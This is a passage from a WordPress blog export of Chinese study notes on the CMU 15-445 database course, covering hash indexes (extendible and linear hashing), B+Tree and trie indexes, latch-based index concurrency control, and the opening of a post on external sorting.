<p>例如在上图的哈希表中对二进制码前缀为<code>00010...</code>的元素进行搜索，由于global计数位为2，得到哈希值<code>00</code>，得到第一个bucket的指针。第一个bucket的local计数为1，说明这个bucket中所有记录的第一位都是相同的。对bucket进行线性搜索即可找到想要的值。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":5} -->
<h5 id="插入">插入</h5>
<!-- /wp:heading -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="http://img.ironmanzzm.top/blog-img/20220221235314.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>对一个元素进行插入时，如果插入的bucket还未满，则可以直接插入。如果桶满了，就需要进行分裂。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><img src="http://img.ironmanzzm.top/blog-img/20220222000942.png" alt=""><br>例如上图的哈希表中，第二个bucket已经有三个元素。现在想插入元素C，它的前缀是<code>10100...</code>。现在global值为2，得到<code>10</code>，找到对应的slot后，得到第二个bucket的指针。当我想对元素进行插入时，发现bucket已经满了，因此需要进行分裂。分裂时slot数组将会被扩容到原来的两倍，并且global计数器加1，同时被分裂的桶的local计数器也加1。slot数组扩容后，新增加的slot从原slot数组对应位置拷贝指针。例如下图中<code>000...</code>与<code>001...</code>对应，<code>001...</code>就从<code>000...</code>处拷贝。而<code>101...</code>对应的slot指向一个被分裂的桶，因此<code>101...</code>指向分裂出来的新桶。对被分裂的桶进行重排，就可以得到新的哈希表。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4 id="线性哈希-linear-hashing">线性哈希 Linear Hashing</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>线性哈希使用与可扩展哈希不同的分裂策略。线性哈希表中，不管哪个链表发生溢出，都会按照固定顺序对一个桶进行分裂。由一个Split指针指示下一个应该被分裂的桶。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":5} -->
<h5 id="插入">插入</h5>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><img src="http://img.ironmanzzm.top/blog-img/20220222001812.png" alt=""><br>假设现在需要插入元素17，现在有哈希函数<code>hash1(key) = key%n</code>，对17进行取模得到插入位置是1。然而位置1指向的桶已经装满了，于是将17放入一个新的桶并链接到原来的链表末尾。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><img src="http://img.ironmanzzm.top/blog-img/20220222002411.png" alt=""><br>接着对slot数组进行扩容，增加一个slot4。然后找到Split指针，对split指针指向的桶进行分裂，对被分裂的桶以2n为模数进行哈希并分配到对应的桶，链接到新增加的slot4。分裂完毕后Split指针指向下一个slot。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>然而现在slot总数改变了，原来的哈希函数<code>hash1</code>不能指向新的slot，于是将模数扩充为原来的两倍，产生第二个哈希函数<code>hash2</code>。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>当Split指针到达最后一个slot，删除<code>hash1</code>函数，然后重新移回第一个slot。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":5} -->
<h5 id="查找">查找</h5>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>现在新的哈希表中有两个哈希函数，在查找时如何知道应该使用哪个？</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><img src="http://img.ironmanzzm.top/blog-img/20220222003032.png" alt=""><br>假设现在要搜索元素<code>20</code>，用<code>hash1</code>计算哈希值，得到<code>0</code>。检查Split指针后发现<code>0</code>在指针指向位置的上方，说明这个桶已经被分裂过，因此使用<code>hash2</code>重新进行计算，得到<code>4</code>。找到slot4指向的桶，进行线性扫描即可。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>如果第一次哈希得到的位置位于Split指针指向的位置，或者该位置的下方，则无需再次哈希。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="总结">总结</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>哈希作为一种高效的查找方法，在数据库系统中有很多应用。对于<code>select * from table where a=b</code>这类精确查找，哈希可以以<code>O(1)</code>的平均复杂度查找到目标。但对于涉及范围的查询，如<code>select * from table where a&gt;b</code>，哈希需要搜索整个表，效率退化为线性查找。因此在实际应用中树状索引，特别是B+树的使用其实更加广泛。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="参考资料">参考资料</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://15445.courses.cs.cmu.edu/fall2021/">https://15445.courses.cs.cmu.edu/fall2021/</a></p>
<!-- /wp:paragraph -->]]></content:encoded>
		<excerpt:encoded><![CDATA[数据库系统中记录被保存在页中，为了能找到某条记录保存在那一页，需要一些数据结构保存两者之间的映射关系。哈希表是常用的索引结构之一。]]></excerpt:encoded>
		<wp:post_id>262</wp:post_id>
		<wp:post_date><![CDATA[2022-02-22 13:45:48]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-02-22 05:45:48]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-02-22 15:09:59]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-02-22 07:09:59]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[06-hash-table]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="cmu-15-445-645"><![CDATA[CMU15-445/645]]></category>
		<category domain="post_tag" nicename="%e6%95%b0%e6%8d%ae%e5%ba%93"><![CDATA[数据库]]></category>
		<category domain="post_tag" nicename="%e7%b4%a2%e5%bc%95"><![CDATA[索引]]></category>
		<category domain="post_tag" nicename="%e8%ae%a1%e7%ae%97%e6%9c%ba%e7%a7%91%e5%ad%a6"><![CDATA[计算机科学]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_thumbnail_id]]></wp:meta_key>
		<wp:meta_value><![CDATA[263]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_layout]]></wp:meta_key>
		<wp:meta_value><![CDATA[inherit]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-disabled]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-insert]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-heading-levels]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:0:{}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-alttext]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-exclude]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[07 Tree Indexes]]></title>
		<link>http://www.ironmanzzm.top/?p=271</link>
		<pubDate>Wed, 23 Feb 2022 04:00:58 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">https://www.ironmanzzm.top/?p=271</guid>
		<description></description>
		<content:encoded><![CDATA[<!-- wp:paragraph -->
<p>数据库中树状索引结构是常用的索引结构。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>B-Tree Family</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>B-Tree家族中使用最广泛的成员是B+Tree. 原始B-Tree的内部结点可以保存value；而B+Tree内部结点只保存指向下一层的page_id，value保存在叶子结点中。在B+Tree中删除某个value后，内部结点中仍然保留该value对应的key，以避免频繁的重构，这一点带来了一些空间浪费。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>但另一方面，由于内部结点保存了实际的数据，B-Tree在并发执行时，对内部结点的修改会同时影响上层结点和下层结点，因此需要在两个方向上加锁，效率低下。而B+Tree只需要对叶结点中的数据进行修改，然后向上逐级传播，在并发执行下效率更高。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>B+Tree</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><strong>由于B+Tree在很多数据结构书都有详细介绍，这里就不再赘述。笔记的重点主要放在B+Tree作为数据库索引，有哪些设计取舍和优化策略。</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>实现时，内部结点中key和value分为两个数组存放，因为两者数据长度不一致。分开存放可以更好地利用CPU缓存。<br><img src="http://img.ironmanzzm.top/blog-img/20220223092919.png" alt=""></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>叶结点中可以有两个种方式存储值：一是以Record_id的方式存储，即指向元组存储位置的指针；二是存储实际的元组数据，数据与对应的键一同保存在叶结点中。PostgreSQL, SQL Server, DB2采用的是第一种方法；SQL Lite, MySQL采用第二种方法。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>设计取舍</h4>
<!-- /wp:heading -->

<!-- wp:heading {"level":5} -->
<h5>结点大小</h5>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>对于不同存储容量的设备，最佳结点大小也不同。通常来说，速度越慢的设备最佳结点大小越大：</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>HDD: ~1MB</li><li>SSD: ~10KB</li><li>In-Memory: ~512B</li></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":5} -->
<h5>归并阈值</h5>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>有些DBMS在结点只有一半满的时候不会进行归并操作，归并操作的延迟可以减少重构的次数。让小结点保留下来，然后定期重建整棵树也许效果更好。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":5} -->
<h5>长度可变的键</h5>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>有四种方法将可变长度的键保存在结点中：</p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol><li>在结点中保存指向元组中作为键的属性的指针。</li><li>令结点长度可变，需要仔细地进行内存管理。</li><li>将所有长度较短的键填充至最大长度。</li><li>嵌入一个指针数组，指针指向对应的键值对。</li></ol>
<!-- /wp:list -->

<!-- wp:heading {"level":4} -->
<h4>B+树索引优化</h4>
<!-- /wp:heading -->

<!-- wp:heading {"level":5} -->
<h5>前缀压缩</h5>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>B+Tree结点内部对value进行排序，因此相邻的几个元素很有可能存在相似性。对于字符串数据，如果几个数据具有相同的前缀，就可以将重叠的前缀抽取出来单独保存。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":5} -->
<h5>后缀截断</h5>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>在内部结点中进行查询的时候，可能只需要看key的前半截就知道应该往左搜索还是往右搜索。在存储的时候就可以直接将后缀截断，只保存前缀。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>批量载入</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>当数据库一开始就已经存在一批数据时，就不需要再以逐个插入的方法自顶向下地构建B+Tree。批量载入的做法是对所有数据进行排序，填充到叶子结点，然后对叶子结点进行分割，逐级向上构建。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Pointer Swizzling</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>B+Tree中以页号的形式保存其他结点的位置，这样我们在查找其他结点时就需要向下层Buffer Pool请求这个结点所在的页，造成额外的开销。对于一些已经被读入到内存，并且被固定（Pin）的页，可以直接将它们的内存地址保存到内部结点中，代替页号，提升一些查询效率。通常树索引的前几层会被频繁访问，因此可以将上层节点固定在内存中。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>重复键存储</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>数据库中有时候需要存储多个与同一个键关联的值。一种方法是在键的后面加上记录的record_id（page_id+offset，即该记录所在物理位置的唯一标识)，将它们变成不同的键；另外一种方法是在叶子结点上加入溢出结点，溢出结点以链表形式链接，当需要插入重复键时，就将这个记录插入到溢出结点。溢出结点中元素存储可以是无序的，因此查找时需要进行线性搜索。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>能不能通过插入时的时间戳来区分重复键？答案是不能。原因一：如果使用物理时间作为时间戳，有可能机器时间实际时间更快，如果运行途中对机器时间进行了校准，同一秒就有可能出现两次。原因二：如果有多台机器同时向服务器提交新的值，也无法区分他们提交的重复键。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>聚簇索引</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>数据库按照记录插入的顺序在磁盘上存储，这样使得搜索时就无法使用二分查找。聚簇索引强制数据库对磁盘上的记录重新按照索引布局进行排序。PostgresSQL中可以使用CLUSTER命令对记录进行聚簇。<sup>[1]</sup></p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>Trie Index</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Trie又称字典树、前缀树，是一种专门为字符串存储和查询而设计的索引结构。查找时从字符串每次读一位，如果树结点存在该字符对应的子树，则继续向后查找，否则树中不存在结果。对前缀树进行插入和查找的时间复杂度都是<code>O(k)</code>，<code>k</code>是操作的字符串的长度。<br><img src="https://img.ironmanzzm.top/blog-img/20220223113221.png" alt=""></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>压缩是常见的字典树优化方法。当从某一个内部结点开始，一直到叶结点都不存在分支，就可以将这条路径压缩为一个结点。<br><img src="https://img.ironmanzzm.top/blog-img/20220223113806.png" alt=""></p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>Radix Tree</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Radix Tree又称基数树，通过元素的二进制位进行查找。若每一层检查n位，则产生2<sup>n</sup>路子树。如下图每一层检查2位，产生4路子树。Radix Tree可以看作前缀树的变种。<sup>[2]</sup></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220223114347.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2>参考资料</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>[1]https://blog.csdn.net/chuckchen1222/article/details/85630528<br>[2]https://www.cnblogs.com/wgwyanfs/p/6887889.html</p>
<!-- /wp:paragraph -->]]></content:encoded>
		<excerpt:encoded><![CDATA[树状索引是最常用的数据库索引，支持精确查找和范围查找。本节以B+Tree为重点，介绍了几种常见的树状索引。]]></excerpt:encoded>
		<wp:post_id>271</wp:post_id>
		<wp:post_date><![CDATA[2022-02-23 12:00:58]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-02-23 04:00:58]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-02-23 12:00:58]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-02-23 04:00:58]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[07-tree-indexes]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="cmu-15-445-645"><![CDATA[CMU15-445/645]]></category>
		<category domain="post_tag" nicename="%e6%95%b0%e6%8d%ae%e5%ba%93"><![CDATA[数据库]]></category>
		<category domain="post_tag" nicename="%e7%b4%a2%e5%bc%95"><![CDATA[索引]]></category>
		<category domain="post_tag" nicename="%e8%ae%a1%e7%ae%97%e6%9c%ba%e7%a7%91%e5%ad%a6"><![CDATA[计算机科学]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_thumbnail_id]]></wp:meta_key>
		<wp:meta_value><![CDATA[272]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_layout]]></wp:meta_key>
		<wp:meta_value><![CDATA[inherit]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-disabled]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-insert]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-heading-levels]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:0:{}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-alttext]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-exclude]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[08 Multi-Threaded Index Concurrency]]></title>
		<link>http://www.ironmanzzm.top/?p=275</link>
		<pubDate>Fri, 25 Feb 2022 06:01:30 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">https://www.ironmanzzm.top/?p=275</guid>
		<description></description>
		<content:encoded><![CDATA[<!-- wp:paragraph -->
<p>并发控制协议在数据库中保证对共享的对象进行并行操作的结果正确性。正确性包括：</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>逻辑正确性：一个线程看到的数据是否正确。</li><li>物理正确性：对象的内部表示是否可靠。</li></ul>
<!-- /wp:list -->

<!-- wp:heading -->
<h2>Lock vs Latch</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Lock和Latch都是为了同步并发执行而引入的数据结构，两者本质上相同，但有一些细小的差别。实际应用中常常会将两者的称呼2混用。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>Locks</h3>
<!-- /wp:heading -->

<!-- wp:list -->
<ul><li>保护数据库保存的数据不受其他事务影响。</li><li>在事务执行过程中一直占有。</li><li>支持回滚操作。</li></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3>Latch</h3>
<!-- /wp:heading -->

<!-- wp:list -->
<ul><li>保护包含DBMS内部数据结构的重要程序段不受其他线程影响。</li><li>在操作期间持有。</li><li>不需要支持回滚。</li></ul>
<!-- /wp:list -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220225102710.png" alt="Lock Vs Latch"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>数据库索引属于内部数据结构，多个线程可能并发地对其进行访问。因此本节主要介绍如何使用Latch对索引进行并发控制。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Latch Modes</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Latch有读和写两种模式。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":5} -->
<h5>Read</h5>
<!-- /wp:heading -->

<!-- wp:list -->
<ul><li>多个线程可以同时对同一个对象进行读操作。</li><li>另一个线程占有读锁时，仍然可以获得该对象的读锁。</li></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":5} -->
<h5>Write</h5>
<!-- /wp:heading -->

<!-- wp:list -->
<ul><li>同一时间只有一个线程可以对对象进行写操作。</li><li>只有对象没有被持有任何锁时，才可以获得它的写锁。</li></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":4} -->
<h4>Latch的实现</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Latch的实现有三种方法：Blocking OS Mutex, Test-and-Set Spin Latch, Reader-Writer Latches</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":5} -->
<h5>OS Mutex</h5>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>使用OS提供的mutex，如Linux底层的futex. 这种实现最为简单，但对数据库系统来说，因为将调度交给了操作系统，这种实现会极大地降低效率（每次调用lock/unlock会花费25ns）。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":5} -->
<h5>Test-and-Set Spin Latch(TAS)</h5>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>申请自旋锁的线程会使用CAS操作尝试对内存中的某块区域进行更新，当尝试失败时数据库系统可以决定下一步应该做什么，而不是直接被操作系统阻塞。c++中std::atomic提供这种实现。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>TAS的缺点是多个线程会频繁进行CAS操作，做很多无用功。由于线程对其他CPU上的缓存行进行轮询，因此会导致缓存一致性问题。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":5} -->
<h5>Reader-Writer Latches</h5>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Mutex和自旋锁都不对读写操作进行区分，DBMS无法对同一个资源进行并发读取。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>RWLatch是Latch可以区分读和写两种状态。它记录了有多少个线程持有该Latch，并在每种模式下等待获取Latch。RWLatch使用Mutex或自旋锁作为底层原语，添加额外的逻辑来维护读者-写者队列。不同的DBMS使用不同的策略。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>对Hash Table加锁</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>哈希表的访问是从上到下，只有一个方向，因此不可能发生死锁。根据粒度不同有两种不同的上锁方法。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":5} -->
<h5>Page Latch</h5>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>以Page为单位获取RWLatch，线程在访问一个页面之前获得一个RLatch或WLatch。这种方法降低了并行性，因为可能一次只有一个线程可以访问页面，但是需要访问页面中的多个slot时的效率非常高，因为只需要获取一个Latch。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":5} -->
<h5>Slot Latch</h5>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>以slot为单位获取RWLatch，这种方法使多个线程可以同时访问同一个Page的不同slot，增加了并行性。但同时由于需要为每个slot保存锁的状态，增加了存储和计算开销。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>对B+Tree加锁</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>主要解决以下两个问题：</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>多个线程试图对同一个节点进行修改。</li><li>一个线程正在对树进行遍历，另一个线程试图对树进行分裂或合并。</li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>保证所有修改都是从一个方向遍历过来的。当遇到冲突时，最好的方法是从头开始执行。对B+Tree进行操作最常用的方法是Latch Crabbing/Coupling Protocol.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":5} -->
<h5>Basic Latch Crabbing/Coupling Protocol</h5>
<!-- /wp:heading -->

<!-- wp:list -->
<ul><li><strong>Search</strong>：从根开始从上至下进行搜索，拥有当前结点的Latch后尝试获取下一个结点的Latch，成功后释放当前结点Latch移动到下一结点。</li><li><strong>Insert/Delete</strong>：与搜索一样尝试获取子结点的latch，但是只有判断子结点是安全的情况下，才会释放父结点latch. 所谓安全是指确定子结点不会被分裂和合并。否则一直持有遍历路径上祖先结点的latch.</li></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":5} -->
<h5>Improved Latch Crabbing/Coupling Protocol</h5>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>原始版本的Latch Crabbing/coupling Protocol的缺点是访问每一个结点都要获得完整的读写权限，程序的并发性会有所降低，因此产生了一个改进版本。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>改进版本对修改操作持“乐观”态度，即认为分裂和合并操作是少数情况。大部分情况下只需要获得非叶结点的RLatch即可。遍历到叶子结点时进行检查，如果发现实际需要分裂或合并，则将当前任务中断重新到根结点查找，并请求获得WLatch.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>死锁问题</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><img src="https://img.ironmanzzm.top/blog-img/20220225135807.png" alt=""><br>使用以上两种策略对B+Tree进行并发控制，如果仅仅是从上到下的访问，是不会产生死锁的。但是当在叶子结点中进行搜索时，由于可能有两个线程从左右两个方向进行访问，就会产生死锁问题。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>索引latch不支持死锁检测或避免，因此在叶结点上尝试获取锁而没有成功时，会直接将当前操作中止，重新执行整个流程。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>延迟更新父结点</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>插入元素时如果需要分裂，会重新遍历一遍以获取父结点的WLatch，这样就带来了性能上的损失。延迟更新父结点策略将插入的结点连接到子结点，然后在一个全局表中记录该节点的父结点需要更新。当下次另一个插入或删除操作搜索到该结点，从全局表中知道这个结点需要修改，就直接获取它的WLatch，并对结点进行更新。</p>
<!-- /wp:paragraph -->]]></content:encoded>
		<excerpt:encoded><![CDATA[数据库内核为了使多个线程可以正确地对索引进行操作，引入了并发控制协议。]]></excerpt:encoded>
		<wp:post_id>275</wp:post_id>
		<wp:post_date><![CDATA[2022-02-25 14:01:30]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-02-25 06:01:30]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-02-25 15:07:35]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-02-25 07:07:35]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[08-multi-threaded-index-concurrency]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="cmu-15-445-645"><![CDATA[CMU15-445/645]]></category>
		<category domain="post_tag" nicename="%e6%95%b0%e6%8d%ae%e5%ba%93"><![CDATA[数据库]]></category>
		<category domain="post_tag" nicename="%e7%b4%a2%e5%bc%95"><![CDATA[索引]]></category>
		<category domain="post_tag" nicename="%e8%ae%a1%e7%ae%97%e6%9c%ba%e7%a7%91%e5%ad%a6"><![CDATA[计算机科学]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_thumbnail_id]]></wp:meta_key>
		<wp:meta_value><![CDATA[276]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_layout]]></wp:meta_key>
		<wp:meta_value><![CDATA[inherit]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-disabled]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-insert]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-heading-levels]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:0:{}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-alttext]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-exclude]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[09 Sorting + Aggregations]]></title>
		<link>http://www.ironmanzzm.top/?p=288</link>
		<pubDate>Thu, 10 Mar 2022 02:58:06 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">https://www.ironmanzzm.top/?p=288</guid>
		<description></description>
		<content:encoded><![CDATA[<!-- wp:paragraph -->
<p>关系模型没有对数据的实际存储顺序进行限定，有时候查询可能对结果排序有所要求(ORDER BY)，并且在一些特定的操作中(DISTINCT, GROUP BY，批量载入元组并建立B+树索引)，排序后执行效率更高。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>外部排序</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>如果数据可以放进内存，可以直接使用快排之类的内存排序算法。否则需要借助外部存储，这种情况需要考虑外部I/O带来的开销。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
